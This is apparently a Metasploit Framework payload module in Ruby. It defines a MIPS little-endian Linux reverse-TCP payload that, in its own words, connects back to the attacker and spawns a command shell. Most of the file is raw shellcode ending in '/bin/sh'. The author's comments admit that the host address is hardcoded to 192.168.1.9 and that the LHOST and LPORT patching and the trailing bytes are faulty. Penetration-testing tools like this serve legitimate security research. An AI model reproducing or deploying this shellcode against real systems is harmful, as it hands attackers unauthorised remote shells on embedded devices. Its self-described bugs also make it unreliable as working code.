##
# $Id: shell_reverse_tcp.rb 4984 2007-06-09 02:25:31Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

# Written in a hurry using shellforge and my MIPS shellforge loader (avail. on cr0.org)

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'


module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Linux
	
	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Command Shell, Reverse TCP Inline',
			'Version'       => '$Revision: 4984 $',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'Julien Tinnes',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_MIPSLE,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
# FIXME: LHOST does'nt patch anything real, host is fixed to 192.168.1.9
# Get shellcode with String.cpu=Metasm::MIPS.new
# 	             sc.decode
# (but Metasploit's version is buggy)
# We need to patch this: (C0A80109 = 192.168.1.9)
#     lui $t0, -3f58h                              ; @4ch  3c08c0a8
#     ori $a2, $t0, 109h                           ; @50h  35060109
							'LHOST'    => [ 0x130, 'ADDR' ],
							'LPORT'    => [ 0x4C, 'n'     ],
						},
					'Payload' =>
"\xef\xff\x09\x24\xff\xff\x10\x05\x82\x82\x08\x28\x27\x48\x20\x01\x21\xc8\x3f\x01\x48\x85\xb9\xaf\x48\x85\xb9\x23\x00\x00\x1c\x3c\x00\x00\x9c\x27\x21\xe0\x99\x03\x00\x00\x89\x8f\xd8\xff\xbd\x27\xe8\x00\x2a\x25\x04\x00\x47\x8d\xe8\x00\x28\x8d\x01\x09\x04\x3c\xc0\xa8\x83\x34\x18\x00\xb9\x27\x02\x00\x06\x24\x12\x26\x05\x24\x08\x00\xa6\xa7\x0a\x00\xa5\xa7\x18\x00\xa8\xaf\x1c\x00\xa7\xaf\x0c\x00\xa3\xaf\x20\x00\xb9\xaf\x24\x00\xa0\xaf\x02\x00\x04\x24\x02\x00\x05\x24\x21\x30\x00\x00\x57\x10\x02\x24\x0c\x00\x00\x00\x21\x18\x40\x00\xff\xff\x02\x24\x1a\x00\x62\x10\x01\x00\x04\x24\x21\x20\x60\x00\x08\x00\xa5\x27\x10\x00\x06\x24\x4a\x10\x02\x24\x0c\x00\x00\x00\x0e\x00\x40\x14\x21\x28\x00\x00\xdf\x0f\x02\x24\x0c\x00\x00\x00\x01\x00\x05\x24\xdf\x0f\x02\x24\x0c\x00\x00\x00\x02\x00\x05\x24\xdf\x0f\x02\x24\x0c\x00\x00\x00\x21\x30\x00\x00\x21\x20\x20\x03\x20\x00\xa5\x27\xab\x0f\x02\x24\x0c\x00\x00\x00\x21\x20\x00\x00\xa1\x0f\x02\x24\x0c\x00\x00\x00\x08\x00\xe0\x03\x28\x00\xbd\x27\xa1\x0f\x02\x24\x0c\x00\x00\x00\xe5\xff\x00\x10\x21\x20\x60\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00"+"0"*80
# FIXME: remove extra 0 bytes!

				}
			))
	end

end